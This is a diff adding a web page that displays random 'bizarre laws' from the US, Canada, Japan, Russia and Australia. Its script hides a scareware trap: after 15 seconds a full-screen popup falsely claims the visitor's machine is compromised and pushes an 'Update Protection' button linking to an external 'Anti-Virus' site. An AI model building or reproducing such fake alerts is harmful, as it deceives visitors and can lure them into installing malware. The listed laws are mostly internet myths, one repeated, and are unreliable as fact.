@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Strange Laws Around the World</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #2a2a2a;
+            color: #ffffff;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #3d3d3d;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(147, 0, 211, 0.3);
+        }
+
+        h1 {
+            color: #ff3366;
+            text-align: center;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .country-section {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #4a4a4a;
+            border-left: 5px solid #9932CC;
+            border-radius: 5px;
+        }
+
+        .country-title {
+            color: #ff3366;
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+
+        .law-text {
+            color: #e0e0e0;
+            line-height: 1.6;
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #3d3d3d;
+            padding: 30px;
+            border: 3px solid #ff3366;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(147, 0, 211, 0.5);
+            z-index: 1000;
+        }
+
+        .update-button {
+            background-color: #ff3366;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .update-button:hover {
+            background-color: #9932CC;
+            transform: scale(1.05);
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Bizarre Laws Around the World</h1>
+        <div id="lawContainer"></div>
+    </div>
+
+    <div class="overlay" id="overlay"></div>
+    <div class="popup" id="popup">
+        <h2 style="color: #ff3366;">⚠️ Your machine has been compromised! Click here to fix it! ⚠️</h2>
+        <a href="https://rubstew21.github.io/Anti-Virus/" class="update-button">Update Protection</a>
+    </div>
+
+    <script>
+        const laws = {
+            'United States': [
+                "In Alabama, it's illegal to carry an ice cream cone in your back pocket at any time.",
+                "In Rhode Island, it's illegal to wear transparent clothing.",
+                "In Minnesota, it's illegal to cross state lines with a duck on your head.",
+                "In Louisiana, it's illegal to tie an alligator to a fire hydrant.",
+                "In Kentucky, it's illegal to carry ice cream in your back pocket."
+            ],
+            'Canada': [
+                "In Alberta, it's illegal to paint a wooden ladder.",
+                "In Montreal, it's illegal to swear in French.",
+                "In Petrolia, Ontario, you must not play loud music in your home.",
+                "In Ottawa, it's illegal to eat ice cream on Bank Street on Sundays.",
+                "In British Columbia, it's illegal to kill a Sasquatch."
+            ],
+            'Japan': [
+                "It's illegal to be overweight in Japan (The Metabo Law).",
+                "Dancing after midnight was illegal until 2015.",
+                "It's illegal to make clones of yourself.",
+                "Stepping on money is illegal.",
+                "It's illegal to take out your trash too early."
+            ],
+            'Russia': [
+                "It's illegal to drive a dirty car in Moscow.",
+                "It's illegal to share WiFi with your neighbors.",
+                "Taking a selfie in certain locations is illegal.",
+                "It's illegal to tell kids that Santa Claus isn't real.",
+                "Showing bare feet in public is illegal in some regions."
+            ],
+            'Australia': [
+                "It's illegal to wear hot pink pants after midday on Sunday in Victoria.",
+                "It's illegal to walk on the right-hand side of a footpath.",
+                "Only qualified electricians can change light bulbs in Victoria.",
+                "It's illegal to possess more than 50kg of potatoes in Western Australia.",
+                "It's illegal to wear fluorescent clothing after dark."
+            ]
+        };
+
+        function getRandomLaw(countryLaws) {
+            return countryLaws[Math.floor(Math.random() * countryLaws.length)];
+        }
+
+        function displayRandomLaws() {
+            const container = document.getElementById('lawContainer');
+            container.innerHTML = '';
+
+            Object.keys(laws).forEach(country => {
+                const section = document.createElement('div');
+                section.className = 'country-section';
+                section.innerHTML = `
+                    <div class="country-title">${country}</div>
+                    <div class="law-text">${getRandomLaw(laws[country])}</div>
+                `;
+                container.appendChild(section);
+            });
+        }
+
+        // Display popup after 15 seconds
+        setTimeout(() => {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('popup').style.display = 'block';
+        }, 15000);
+
+        // Initial display
+        displayRandomLaws();
+    </script>
+</body>
+</html>
